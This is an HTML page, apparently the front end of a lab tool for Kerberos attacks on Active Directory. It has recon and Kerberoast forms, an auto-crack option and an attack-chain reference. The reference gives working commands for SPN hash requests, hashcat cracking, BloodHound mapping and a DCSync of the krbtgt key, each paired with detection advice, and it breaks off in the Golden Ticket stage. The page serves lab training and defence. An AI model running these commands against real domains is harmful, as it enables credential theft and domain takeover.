             margin:0;padding:13px 16px;border-bottom:1px solid var(--line);background:var(--surface-2)}
  .card .body{padding:16px}

  label.lab{display:block;font-size:12px;color:var(--muted);margin-bottom:5px}
  label.lab .flag{font-family:var(--mono);font-size:11px;color:var(--faint)}
  input[type=text],input[type=password],textarea{
    width:100%;background:var(--inset);border:1px solid var(--line);color:var(--ink);
    border-radius:8px;padding:9px 11px;font-size:13px;font-family:var(--sans);outline:none}
  input::placeholder,textarea::placeholder{color:#495563}
  input:focus,textarea:focus{border-color:var(--gold-line);box-shadow:0 0 0 3px var(--gold-bg)}
  textarea{resize:vertical;min-height:66px;font-family:var(--mono);font-size:12px}

  button.run{background:var(--gold);color:#231a05;border:0;border-radius:9px;
             padding:11px 20px;font-size:14px;font-weight:600;cursor:pointer;font-family:var(--sans);
             display:inline-flex;align-items:center;gap:9px}
  button.run:hover{background:#f3ce72}
  button.run:disabled{opacity:.55;cursor:not-allowed}
  button.ghost{background:transparent;color:var(--muted);border:1px solid var(--line);
               border-radius:8px;padding:9px 14px;font-size:12.5px;cursor:pointer;font-family:var(--sans)}
  button.ghost:hover{color:var(--ink);border-color:var(--line-2)}
  .spin{width:15px;height:15px;border:2px solid rgba(0,0,0,.3);border-top-color:#231a05;
        border-radius:50%;animation:sp .7s linear infinite;display:none}
  @keyframes sp{to{transform:rotate(360deg)}}

  /* ---- RECON tab ---- */
  .recon-wrap{max-width:720px}
  .recon-row{display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap}
  .recon-row .grow{flex:1 1 260px}
  .recon-note{color:var(--faint);font-size:12px;margin:12px 0 0;line-height:1.55}
  .kv{display:grid;grid-template-columns:150px 1fr;gap:1px;background:var(--line);
      border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-top:16px}
  .kv .k,.kv .v{background:var(--surface);padding:10px 13px}
  .kv .k{color:var(--muted);font-size:12px}
  .kv .v{font-family:var(--mono);font-size:12.5px;color:var(--ink);word-break:break-all}
  .kv .v.gold{color:var(--gold)}
  .recon-status{display:flex;align-items:center;gap:9px;font-size:12.5px;color:var(--muted);margin-top:14px}
  .dot{width:9px;height:9px;border-radius:50%;background:var(--faint)}
  .dot.run{background:var(--gold);animation:pulse 1s infinite}
  .dot.ok{background:var(--teal)} .dot.err{background:var(--red)}
  @keyframes pulse{50%{opacity:.35}}
  .ports{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:8px}
  .port{display:flex;align-items:center;gap:9px;padding:8px 11px;border:1px solid var(--line);border-radius:8px;background:var(--inset);font-size:12px}
  .port .pd{width:8px;height:8px;border-radius:50%;background:var(--faint);flex:0 0 auto}
  .port.open{border-color:var(--teal-line)}
  .port.open .pd{background:var(--teal)}
  .port .pp{font-family:var(--mono);color:var(--muted)}
  .port.open .pp{color:var(--teal)}
  .port .ps{margin-left:auto;color:var(--faint);font-size:10.5px;text-align:right}
  .kv .v.teal{color:var(--teal)}

  /* ---- KERBEROAST tab ---- */
  .grid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.25fr);gap:20px}
  @media(max-width:900px){.grid{grid-template-columns:1fr}}
  .fset{margin:0 0 18px;padding:0;border:0}
  .fset:last-child{margin-bottom:0}
  .fset > legend{font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:var(--faint);padding:0;margin:0 0 10px;font-weight:600}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  @media(max-width:520px){.row{grid-template-columns:1fr}}
  .field{margin-bottom:12px}.field:last-child{margin-bottom:0}
  .checks{display:grid;grid-template-columns:1fr 1fr;gap:8px 14px}
  @media(max-width:520px){.checks{grid-template-columns:1fr}}
  .chk{display:flex;align-items:flex-start;gap:8px;font-size:12.5px;cursor:pointer;padding:6px 8px;border-radius:7px;border:1px solid transparent}
  .chk:hover{background:var(--surface-2)}
  .chk input{margin-top:2px;accent-color:var(--gold);width:15px;height:15px;flex:0 0 auto}
  .chk .cx{display:flex;flex-direction:column}
  .chk .cx .flag{font-family:var(--mono);font-size:10.5px;color:var(--faint)}
  .actions{display:flex;gap:10px;align-items:center;margin-top:4px}
  .elapsed{font-family:var(--mono);font-size:12px;color:var(--muted)}
  .status{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--muted);padding:2px 0 14px}
  .empty{color:var(--faint);font-size:13px;text-align:center;padding:36px 10px}
  .empty svg{opacity:.35;margin-bottom:10px}
  .sec{margin-bottom:20px}.sec:last-child{margin-bottom:0}
  .sec-h{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:9px}
  .sec-h h3{font-size:11.5px;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);margin:0}
  .pill{font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--line);border-radius:20px;padding:2px 9px}
  .tblwrap{overflow-x:auto;border:1px solid var(--line);border-radius:9px}
  table{border-collapse:collapse;width:100%;font-size:12.5px;min-width:640px}
  th{position:sticky;top:0;text-align:left;background:var(--surface-2);color:var(--muted);font-weight:600;
     font-size:11px;text-transform:uppercase;letter-spacing:.5px;padding:9px 11px;border-bottom:1px solid var(--line);white-space:nowrap}
  td{padding:8px 11px;border-bottom:1px solid #1f2731;vertical-align:top}
  tr:last-child td{border-bottom:0}
  tr:hover td{background:var(--gold-bg)}
  td.spn{font-family:var(--mono);color:var(--gold);word-break:break-all}
  td.name{font-family:var(--mono);color:var(--ink)}
  td.mono{font-family:var(--mono);color:var(--muted);white-space:nowrap}
  .tag{font-family:var(--mono);font-size:11px;padding:1px 7px;border-radius:5px}
  .tag.unc{background:var(--red-bg);color:#ff9d97;border:1px solid var(--red-line)}
  .tag.con{background:var(--gold-bg);color:var(--gold);border:1px solid var(--gold-line)}
  .hashbox{background:var(--inset);border:1px solid var(--line);border-radius:9px;padding:12px;font-family:var(--mono);font-size:12px;max-height:320px;overflow:auto}
  .hashbox .h{color:#c9d5e3;word-break:break-all;padding:3px 0;border-bottom:1px dashed #1b222b}
  .hashbox .h:last-child{border-bottom:0}
  .hashbox .h .et{color:var(--gold)}
  .btnrow{display:flex;gap:8px;flex-wrap:wrap}
  .logbox{background:var(--inset);border:1px solid var(--line);border-radius:9px;padding:10px 12px;font-family:var(--mono);font-size:11.5px;max-height:200px;overflow:auto}
  .logbox .l{padding:2px 0;white-space:pre-wrap;word-break:break-word}
  .l .lv{display:inline-block;min-width:62px;color:var(--faint)}
  .l.ERROR .lv,.l.CRITICAL .lv{color:var(--red)}
  .l.WARNING .lv{color:var(--gold)}
  .l.INFO .lv{color:var(--teal)}
  .errbox{background:var(--red-bg);border:1px solid var(--red-line);color:#ffc4c0;border-radius:9px;padding:12px 14px;font-size:13px;font-family:var(--mono)}
  .hintbox{margin-top:8px;background:var(--teal-bg);border:1px solid var(--teal-line);color:var(--ink);border-radius:9px;padding:10px 13px;font-size:12.5px;line-height:1.55}
  .hintbox b{color:var(--teal)}
  .toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(20px);
         background:#22303f;color:var(--ink);border:1px solid #34506e;border-radius:9px;padding:10px 16px;font-size:13px;opacity:0;pointer-events:none;transition:.25s}
  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}

  /* ---- CHAIN tab ---- */
  .chain-wrap{max-width:920px}
  .figwrap{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:20px 18px 10px;overflow-x:auto}
  .diagram{display:block;width:100%;min-width:620px;height:auto;color:var(--ink)}
  .diagram .region-pre{fill:var(--surface-2)}
  .diagram .region-t0{fill:var(--gold-bg)}
  .diagram .node{fill:var(--inset);stroke:var(--line-2);stroke-width:1.4}
  .diagram .node-t0{fill:var(--inset);stroke:var(--gold-line);stroke-width:1.6}
  .diagram .nlabel{fill:var(--ink);font-family:var(--mono);font-size:13px;font-weight:600}
  .diagram .nlabel-t0{fill:var(--gold)}
  .diagram .nsub{fill:var(--faint);font-family:var(--mono);font-size:10px}
  .diagram .edge{stroke:var(--ink);stroke-width:1.6;fill:none;opacity:.55}
  .diagram .edge-danger{stroke:var(--red);stroke-width:2;fill:none;stroke-dasharray:6 4}
  .diagram .elabel{fill:var(--muted);font-family:var(--mono);font-size:10.5px}
  .diagram .elabel-d{fill:var(--red);font-family:var(--mono);font-size:10.5px;font-weight:600}
  .diagram .regtitle{fill:var(--faint);font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.15em}
  .diagram .boundary{stroke:var(--red);stroke-width:1.6;stroke-dasharray:3 4;opacity:.85}
  .diagram .btext{fill:var(--red);font-family:var(--mono);font-size:9.5px;font-weight:600;letter-spacing:.13em}
  .diagram .ahead{fill:var(--ink);opacity:.55}
  .diagram .ahead-d{fill:var(--red)}
  .figcap{font-size:12.5px;color:var(--muted);margin:12px 4px 0;line-height:1.5}
  .figcap b{color:var(--ink)}
  .stage{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:20px;margin-top:16px}
  .st-head{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap}
  .st-num{font-family:var(--mono);font-size:12px;font-weight:600;color:var(--gold);border:1px solid var(--gold-line);border-radius:6px;padding:2px 8px}
  .st-name{font-family:var(--disp);font-weight:700;font-size:16px;margin:0;flex:1 1 auto}
  .chip{font-family:var(--mono);font-size:10.5px;padding:3px 9px;border-radius:20px;white-space:nowrap}
  .chip.att{color:var(--muted);background:var(--surface-2);border:1px solid var(--line)}
  .chip.z0{color:var(--muted);background:var(--surface-2);border:1px solid var(--line)}
  .chip.zt{color:var(--gold);background:var(--gold-bg);border:1px solid var(--gold-line)}
  .st-mech{margin:13px 0 0;font-size:13.5px;line-height:1.6;color:var(--ink)}
  .st-mech .term{font-family:var(--mono);font-size:.9em;background:var(--surface-2);padding:1px 5px;border-radius:4px}
  .cmd{margin:13px 0 0;background:var(--inset);border:1px solid var(--line);border-radius:9px;overflow:hidden}
  .cmd-tab{padding:7px 13px;border-bottom:1px solid var(--line);font-family:var(--mono);font-size:10px;letter-spacing:.13em;text-transform:uppercase}
  .cmd-tab .off{color:var(--red);font-weight:600}
  .cmd-tab .tool{color:var(--faint)}
  .cmd pre{margin:0;padding:12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.65}
  .cmd .p{color:var(--faint)} .cmd .fl{color:var(--gold)} .cmd .cm{color:var(--faint)}
  .yield{display:flex;gap:9px;margin:12px 0 0;font-size:12.5px;color:var(--muted)}
  .yield .arw{color:var(--gold);font-family:var(--mono);font-weight:600}
  .yield b{color:var(--ink);font-family:var(--mono);font-size:12px}
  .defend{margin:15px 0 0;background:var(--teal-bg);border:1px solid var(--teal-line);border-radius:9px;padding:12px 15px}
  .defend .dh{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.13em;text-transform:uppercase;color:var(--teal);margin-bottom:7px}
  .defend .dh svg{width:13px;height:13px;stroke:var(--teal);fill:none}
  .defend p{margin:0;font-size:12.5px;line-height:1.55;color:var(--ink)}
  .defend .evt{font-family:var(--mono);font-size:.85em;color:var(--teal);font-weight:600}
  .chain-note{margin-top:18px;padding:12px 15px;border:1px dashed var(--line-2);border-radius:9px;color:var(--muted);font-size:12.5px;line-height:1.55}

  footer{margin-top:28px;color:var(--faint);font-size:11.5px;text-align:center;line-height:1.7}
</style>
</head>
<body>
<div class="wrap">

  <header class="top">
    <div class="logo">&#127915;</div>
    <div>
      <p class="eyebrow">Active Directory &middot; Lab Toolkit</p>
      <h1>Kerberos Kill Chain</h1>
    </div>
  </header>

  %%IMPORT_ERROR_BANNER%%

  <div class="scope">
    <span class="k">Lab only</span>
    <span><b>Recon</b> and <b>Kerberoast</b> below execute against the target you point them at; run them only on a
    lab you own (GOAD, a home AD) or an authorized engagement. The <b>Attack chain</b> tab documents the tier-0
    tail (DCSync, Golden Ticket) as reference, not automation. Keep this server on <b>127.0.0.1</b>.</span>
  </div>

  <div class="tabs">
    <button class="tab active" data-tab="recon"><span class="n">01</span> Recon</button>
    <button class="tab" data-tab="roast"><span class="n">02</span> Kerberoast</button>
    <button class="tab" data-tab="chain">Attack chain</button>
  </div>

  <!-- =============== RECON =============== -->
  <section class="panel active" id="panel-recon">
    <div class="recon-wrap">
      <div class="card">
        <h2>Stage 1 &middot; Discover domain from a DC IP</h2>
        <div class="body">
          <div class="recon-row">
            <div class="grow">
              <label class="lab">DC IP or hostname <span class="flag">smb / rootDSE</span></label>
              <input type="text" id="reconIp" placeholder="10.10.10.10" autocomplete="off">
            </div>
            <button class="run" id="reconBtn"><span class="spin" id="reconSpin"></span><span id="reconLabel">Discover</span></button>
          </div>
          <p class="recon-note">Read-only: reads the domain, baseDN and DC name straight out of the SMB
            negotiation &mdash; no credentials, no writes. This is the <span style="color:var(--gold)">IP &rarr; Domain</span> hop.</p>

          <div class="recon-status" id="reconStatus" style="display:none">
            <span class="dot" id="reconDot"></span><span id="reconStatusText"></span>
          </div>
          <div id="reconOut" style="display:none">
            <div class="kv">
              <div class="k">Domain (FQDN)</div><div class="v gold" id="rv-domain">&mdash;</div>
              <div class="k">baseDN</div><div class="v" id="rv-basedn">&mdash;</div>
              <div class="k">DC host</div><div class="v" id="rv-host">&mdash;</div>
              <div class="k">NetBIOS domain</div><div class="v" id="rv-nbdom">&mdash;</div>
              <div class="k">NetBIOS name</div><div class="v" id="rv-nbname">&mdash;</div>
              <div class="k">OS</div><div class="v" id="rv-os">&mdash;</div>
            </div>
            <div id="portsWrap" style="display:none;margin-top:18px">
              <div class="sec-h"><h3>AD ports</h3><span class="pill" id="portsOpen">0 open</span></div>
              <div class="ports" id="portsGrid"></div>
            </div>
            <div class="btnrow" style="margin-top:16px">
              <button class="run" id="toRoast">Send to Kerberoast &rarr;</button>
            </div>
          </div>
          <div id="reconErr" class="errbox" style="display:none;margin-top:16px"></div>
        </div>
      </div>
    </div>
  </section>

  <!-- =============== KERBEROAST =============== -->
  <section class="panel" id="panel-roast">
    <div class="grid">
      <div class="card">
        <h2>Stage 2 &middot; Kerberoast parameters</h2>
        <div class="body">
          <form id="form" autocomplete="off">
            <fieldset class="fset">
              <legend>Target &amp; identity</legend>
              <div class="row">
                <div class="field"><label class="lab">Domain <span class="flag">domain</span></label>
                  <input type="text" name="user_domain" placeholder="lab.local" required></div>
                <div class="field"><label class="lab">Target domain <span class="flag">-target-domain</span></label>
                  <input type="text" name="target_domain" placeholder="(cross-trust, optional)"></div>
              </div>
              <div class="row">
                <div class="field"><label class="lab">Username <span class="flag">username</span></label>
                  <input type="text" name="username" placeholder="jdoe"></div>
                <div class="field"><label class="lab">Password <span class="flag">password</span></label>
                  <input type="password" name="password" placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;"></div>
              </div>
            </fieldset>
            <fieldset class="fset">
              <legend>Authentication</legend>
              <div class="row">
                <div class="field"><label class="lab">NTLM hashes <span class="flag">-hashes</span></label>
                  <input type="text" name="hashes" placeholder="LMHASH:NTHASH"></div>
                <div class="field"><label class="lab">AES key <span class="flag">-aesKey</span></label>
                  <input type="text" name="aes_key" placeholder="128/256-bit hex"></div>
              </div>
              <div class="checks">
                <label class="chk"><input type="checkbox" name="kerberos"><span class="cx">Use Kerberos / ccache<span class="flag">-k</span></span></label>
                <label class="chk"><input type="checkbox" name="no_pass"><span class="cx">No password prompt<span class="flag">-no-pass</span></span></label>
              </div>
            </fieldset>
            <fieldset class="fset">
              <legend>Connection</legend>
              <div class="row">
                <div class="field"><label class="lab">DC IP <span class="flag">-dc-ip</span></label>
                  <input type="text" name="dc_ip" placeholder="10.10.10.10"></div>
                <div class="field"><label class="lab">DC hostname <span class="flag">-dc-host</span></label>
                  <input type="text" name="dc_host" placeholder="dc01.lab.local"></div>
              </div>
            </fieldset>
            <fieldset class="fset">
              <legend>Roasting options</legend>
              <div class="checks">
                <label class="chk"><input type="checkbox" name="request" checked><span class="cx">Request TGS (roast)<span class="flag">-request</span></span></label>
                <label class="chk"><input type="checkbox" name="machine_only"><span class="cx">Machine accounts only<span class="flag">-machine-only</span></span></label>
                <label class="chk"><input type="checkbox" name="stealth"><span class="cx">Stealth (no SPN filter)<span class="flag">-stealth</span></span></label>
                <label class="chk"><input type="checkbox" name="no_rc4"><span class="cx">Don't force RC4<span class="flag">-no-rc4</span></span></label>
                <label class="chk"><input type="checkbox" name="save"><span class="cx">Save .ccache<span class="flag">-save</span></span></label>
                <label class="chk"><input type="checkbox" name="debug"><span class="cx">Debug logging<span class="flag">-debug</span></span></label>
              </div>
              <div class="row" style="margin-top:12px">
                <div class="field"><label class="lab">Request user <span class="flag">-request-user</span></label>
                  <input type="text" name="request_user" placeholder="single sAMAccountName"></div>
                <div class="field"><label class="lab">Request machine <span class="flag">-request-machine</span></label>
                  <input type="text" name="request_machine" placeholder="workstation01$"></div>
              </div>
              <div class="field" style="margin-top:2px"><label class="lab">No-preauth account <span class="flag">-no-preauth</span></label>
                <input type="text" name="no_preauth" placeholder="AS-REP roast account"></div>
              <div class="field"><label class="lab">Users list <span class="flag">-usersfile</span> &mdash; one per line (required with -no-preauth)</label>
                <textarea name="users_list" placeholder="svc-sql&#10;svc-web"></textarea></div>
              <div class="field"><label class="lab">Save directory <span class="flag">(for -save)</span></label>
                <input type="text" name="save_dir" placeholder="."></div>
            </fieldset>
            <fieldset class="fset">
              <legend>Auto-crack (offline dictionary)</legend>
              <div class="checks">
                <label class="chk"><input type="checkbox" name="autocrack"><span class="cx">Auto-crack hashes after roast<span class="flag">RC4 / etype 23</span></span></label>
              </div>
              <div class="field" style="margin-top:10px"><label class="lab">Wordlist &mdash; paste candidates, one per line</label>
                <textarea id="wordlist" placeholder="Password1&#10;Summer2026!&#10;Company123"></textarea></div>
              <div class="field"><label class="lab">or server wordlist path <span class="flag">(big lists: slow in pure Python)</span></label>
                <input type="text" id="wordlist_path" placeholder="/usr/share/wordlists/rockyou.txt"></div>
            </fieldset>
            <div class="actions">
              <button type="submit" class="run" id="runBtn"><span class="spin" id="spin"></span><span id="runLabel">Run Kerberoast</span></button>
              <button type="reset" class="ghost">Reset</button>
              <span class="elapsed" id="elapsed"></span>
            </div>
          </form>
        </div>
      </div>

      <div class="card">
        <h2>Results</h2>
        <div class="body">
          <div class="status" id="status" style="display:none"><span class="dot" id="dot"></span><span id="statusText"></span></div>
          <div id="placeholder" class="empty">
            <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M21 21l-4.3-4.3M11 19a8 8 0 100-16 8 8 0 000 16z"/></svg>
            <div>Discover a domain, or fill the form, then run.</div>
          </div>
          <div id="output" style="display:none">
            <div class="sec" id="errSec" style="display:none"><div class="errbox" id="errText"></div><div class="hintbox" id="hintText" style="display:none"></div></div>
            <div class="sec" id="tblSec" style="display:none">
              <div class="sec-h"><h3>Service accounts (SPNs)</h3><span class="pill" id="spnCount">0</span></div>
              <div class="tblwrap"><table><thead><tr>
                <th>ServicePrincipalName</th><th>Name</th><th>MemberOf</th><th>PasswordLastSet</th><th>LastLogon</th><th>Delegation</th>
              </tr></thead><tbody id="tblBody"></tbody></table></div>
            </div>
            <div class="sec" id="hashSec" style="display:none">
              <div class="sec-h"><h3>Crackable hashes (JtR / hashcat)</h3><span class="pill" id="hashCount">0</span></div>
              <div class="hashbox" id="hashBox"></div>
              <div class="btnrow" style="margin-top:10px">
                <button class="ghost" id="copyBtn">Copy all</button>
                <button class="ghost" id="dlBtn">Download .txt</button>
                <span class="pill">mode 13100 (RC4) &middot; 19600/19700 (AES)</span>
              </div>
            </div>
            <div class="sec" id="ticketSec" style="display:none">
              <div class="sec-h"><h3>Saved tickets</h3></div><div class="hashbox" id="ticketBox"></div>
            </div>
            <div class="sec" id="crackSec" style="display:none">
              <div class="sec-h"><h3>Recovered passwords (by user)</h3><span class="pill" id="crackCount">0</span></div>
              <div class="recon-status" id="crackProg" style="display:none"><span class="dot run"></span><span id="crackProgText"></span></div>
              <div class="kv" id="crackKv" style="grid-template-columns:180px 1fr"></div>
              <div class="btnrow" style="margin-top:10px">
                <button class="ghost" id="crackBtn">Crack recovered hashes</button>
                <span class="pill" id="crackNote">RC4 / etype 23 &middot; weak passwords only</span>
              </div>
            </div>
            <div class="sec" id="logSec" style="display:none">
              <div class="sec-h"><h3>Log</h3><span class="pill" id="logCount">0</span></div><div class="logbox" id="logBox"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- =============== ATTACK CHAIN =============== -->
  <section class="panel" id="panel-chain">
    <div class="chain-wrap">
      <div class="figwrap">
        <svg class="diagram" viewBox="0 0 1020 300" role="img"
             aria-label="Five-node Kerberos attack chain: DC IP, Domain and SPN/TGS hash sit left of a dashed red privilege boundary in an 'any authenticated user' zone; KRBTGT and Golden Ticket sit right in a tier-0 zone. The boundary-crossing edge is red, labelled crack, escalate, DCSync.">
          <defs>
            <marker id="ah" markerWidth="10" markerHeight="10" refX="7.5" refY="3" orient="auto"><path class="ahead" d="M0,0 L7.5,3 L0,6 Z"></path></marker>
            <marker id="ahd" markerWidth="10" markerHeight="10" refX="7.5" refY="3" orient="auto"><path class="ahead-d" d="M0,0 L7.5,3 L0,6 Z"></path></marker>
          </defs>
          <rect class="region-pre" x="12" y="72" width="566" height="176" rx="12"></rect>
          <rect class="region-t0" x="604" y="72" width="404" height="176" rx="12"></rect>
          <text class="regtitle" x="295" y="62" text-anchor="middle">ANY AUTHENTICATED USER</text>
          <text class="regtitle" x="806" y="62" text-anchor="middle">DOMAIN DOMINANCE &middot; TIER 0</text>
          <line class="boundary" x1="591" y1="76" x2="591" y2="244"></line>
          <text class="btext" x="591" y="150" text-anchor="middle" transform="rotate(-90 591 150)">PRIVILEGE BOUNDARY</text>
          <line class="edge" x1="146" y1="150" x2="210" y2="150" marker-end="url(#ah)"></line>
          <text class="elabel" x="178" y="140" text-anchor="middle">rootDSE</text>
          <line class="edge" x1="338" y1="150" x2="406" y2="150" marker-end="url(#ah)"></line>
          <text class="elabel" x="372" y="140" text-anchor="middle">Kerberoast</text>
          <line class="edge-danger" x1="548" y1="150" x2="642" y2="150" marker-end="url(#ahd)"></line>
          <text class="elabel-d" x="596" y="132" text-anchor="middle">crack &rarr; escalate</text>
          <text class="elabel-d" x="596" y="176" text-anchor="middle">&rarr; DCSync</text>
          <line class="edge" x1="778" y1="150" x2="840" y2="150" marker-end="url(#ah)"></line>
          <text class="elabel" x="809" y="140" text-anchor="middle">forge TGT</text>
          <g><rect class="node" x="26" y="122" width="120" height="56" rx="9"></rect>
            <text class="nlabel" x="86" y="147" text-anchor="middle">DC IP</text><text class="nsub" x="86" y="164" text-anchor="middle">10.10.10.10</text></g>
          <g><rect class="node" x="210" y="122" width="128" height="56" rx="9"></rect>
            <text class="nlabel" x="274" y="147" text-anchor="middle">Domain</text><text class="nsub" x="274" y="164" text-anchor="middle">lab.local &middot; baseDN</text></g>
          <g><rect class="node" x="418" y="122" width="130" height="56" rx="9"></rect>
            <text class="nlabel" x="483" y="147" text-anchor="middle">SPN &rarr; TGS</text><text class="nsub" x="483" y="164" text-anchor="middle">$krb5tgs$ hash</text></g>
          <g><rect class="node-t0" x="642" y="122" width="128" height="56" rx="9"></rect>
            <text class="nlabel" x="706" y="147" text-anchor="middle">KRBTGT</text><text class="nsub" x="706" y="164" text-anchor="middle">domain master key</text></g>
          <g><rect class="node-t0" x="840" y="122" width="152" height="56" rx="9"></rect>
            <text class="nlabel nlabel-t0" x="916" y="147" text-anchor="middle">Golden Ticket</text><text class="nsub" x="916" y="164" text-anchor="middle">forged TGT</text></g>
        </svg>
      </div>
      <p class="figcap">The short version &mdash; <b>ip &gt; domain &gt; spn &gt; golden ticket</b> &mdash; hides the hardest edge.
        Kerberoasting lands a service-account hash left of the <b>privilege boundary</b>; nothing reaches KRBTGT unless that
        account is actually privileged and you can DCSync. That red hop is three steps, not one. Tabs 1&ndash;2 run; stages 4&ndash;5 are reference.</p>

      <article class="stage">
        <div class="st-head"><span class="st-num">01</span><h3 class="st-name">Discovery &mdash; IP to Domain</h3><span class="chip z0">pre-boundary</span><span class="chip att">T1590 / T1087</span></div>
        <p class="st-mech">A DC answers an <b>unauthenticated</b> query to its <span class="term">rootDSE</span> / SMB negotiation, leaking
          <span class="term">defaultNamingContext</span> and <span class="term">dnsHostName</span>. Nothing is exploited &mdash; it's advertised by design. <b>This is the Recon tab.</b></p>
        <div class="cmd"><div class="cmd-tab"><span class="tool">recon &middot; read-only</span></div>
          <pre><span class="p">$ </span>nxc smb 10.10.10.10                 <span class="cm"># domain, host, OS</span>
<span class="p">$ </span>ldapsearch <span class="fl">-x</span> <span class="fl">-H</span> ldap://10.10.10.10 <span class="fl">-s</span> base defaultNamingContext</pre></div>
        <p class="yield"><span class="arw">yields &rarr;</span> <b>lab.local</b>, <b>DC=lab,DC=local</b>, DC host.</p>
        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
          <p>Discovery is by-design, so the control is <b>network</b>: segment management interfaces and watch for enumeration bursts. This stage is your cue the rest is coming.</p></div>
      </article>

      <article class="stage">
        <div class="st-head"><span class="st-num">02</span><h3 class="st-name">Kerberoast &mdash; Domain to SPN hash</h3><span class="chip z0">pre-boundary</span><span class="chip att">T1558.003</span></div>
        <p class="st-mech">Any authenticated principal may request a <span class="term">TGS-REP</span> for any SPN; part of it is encrypted with the
          <b>service account's</b> key. If the KDC offers <span class="term">RC4 (etype 23)</span> it cracks cheaply offline. gMSA/machine accounts are uncrackable &mdash; <b>human-set service accounts are the target.</b> <b>This is the Kerberoast tab.</b></p>
        <div class="cmd"><div class="cmd-tab"><span class="off">offense</span><span class="tool">&middot; impacket GetUserSPNs &rarr; hashcat</span></div>
          <pre><span class="p">$ </span>GetUserSPNs.py lab.local/jdoe:pass <span class="fl">-dc-ip</span> 10.10.10.10 <span class="fl">-request</span>
<span class="p">$ </span>hashcat <span class="fl">-m</span> 13100 tgs.txt rockyou.txt      <span class="cm"># 19600/19700 = AES</span></pre></div>
        <p class="yield"><span class="arw">yields &rarr;</span> a service account's <b>plaintext</b> &mdash; only if weak.</p>
        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
          <p>Watch <span class="evt">Event 4769</span> with encryption type <span class="evt">0x17</span> (RC4) or one account pulling many SPNs. Plant a <b>honeypot SPN</b>; enforce AES; move services to <b>gMSA</b> so the password stops being guessable.</p></div>
      </article>

      <article class="stage">
        <div class="st-head"><span class="st-num">03</span><h3 class="st-name">The privilege boundary &mdash; the hop the arrow hides</h3><span class="chip z0">gate</span><span class="chip att">T1078 / T1069</span></div>
        <p class="st-mech">A cracked service account is just <b>a user</b>. It only advances if it holds privilege &mdash; classically a <b>Domain Admin left with an SPN</b>.
          This is where <span class="term">spn &gt; golden ticket</span> lies: most roasted accounts go <b>sideways</b>, not up. Map it with BloodHound &mdash; is there a path to Tier 0?</p>
        <div class="cmd"><div class="cmd-tab"><span class="tool">triage &middot; does it even cross?</span></div>
          <pre><span class="p">$ </span>bloodhound-python <span class="fl">-u</span> svc <span class="fl">-p</span> cracked <span class="fl">-d</span> lab.local <span class="fl">-c</span> All
<span class="p">  </span><span class="cm"># shortest path: SVC &rarr; Domain Admins ?</span></pre></div>
        <p class="yield"><span class="arw">yields &rarr;</span> <b>maybe</b> DA-equivalent rights. Usually: nothing, keep roasting.</p>
        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
          <p>This misconfig is why the chain closes &mdash; so close it. Find privileged accounts carrying a <span class="evt">servicePrincipalName</span> and strip it; use <b>Protected Users</b> and a tiered admin model. Break this gate and 4&ndash;5 never happen.</p></div>
      </article>

      <article class="stage">
        <div class="st-head"><span class="st-num">04</span><h3 class="st-name">DCSync &mdash; grab the KRBTGT key</h3><span class="chip zt">tier 0</span><span class="chip att">T1003.006</span></div>
        <p class="st-mech">With <span class="term">Replicating Directory Changes</span> rights (DAs/EAs/DCs by default) an account drives the <b>DRSUAPI</b>
          replication API and asks a DC to hand over any secret &mdash; <b>no code runs on the DC</b>. Target: <span class="term">krbtgt</span> + domain SID. <b>Reference &mdash; not run by this tool.</b></p>
        <div class="cmd"><div class="cmd-tab"><span class="tool">reference &middot; impacket secretsdump</span></div>
          <pre><span class="p">$ </span>secretsdump.py lab.local/dauser@10.10.10.10 <span class="fl">-just-dc-user</span> krbtgt</pre></div>
        <p class="yield"><span class="arw">yields &rarr;</span> <b>krbtgt NTLM + AES keys</b>, <b>domain SID</b>.</p>
        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
          <p>Highest-fidelity alert in the chain: <span class="evt">Event 4662</span> referencing the replication GUID <span class="evt">1131f6aa-&hellip;</span> from a principal that <b>isn't a DC</b>. Restrict replication rights to DCs and monitor that ACL.</p></div>
      </article>

      <article class="stage">
        <div class="st-head"><span class="st-num">05</span><h3 class="st-name">Golden Ticket &mdash; forge domain persistence</h3><span class="chip zt">tier 0</span><span class="chip att">T1558.001</span></div>
        <p class="st-mech">The KRBTGT key signs the <b>PAC</b> in every TGT. With it + the domain SID you <b>forge</b> a TGT for any user/RID/lifetime that the KDC trusts.
          It survives the user's password reset; only rolling <b>krbtgt twice</b> kills it. This is <b>persistence</b>, not access. <b>Reference &mdash; not run by this tool.</b></p>
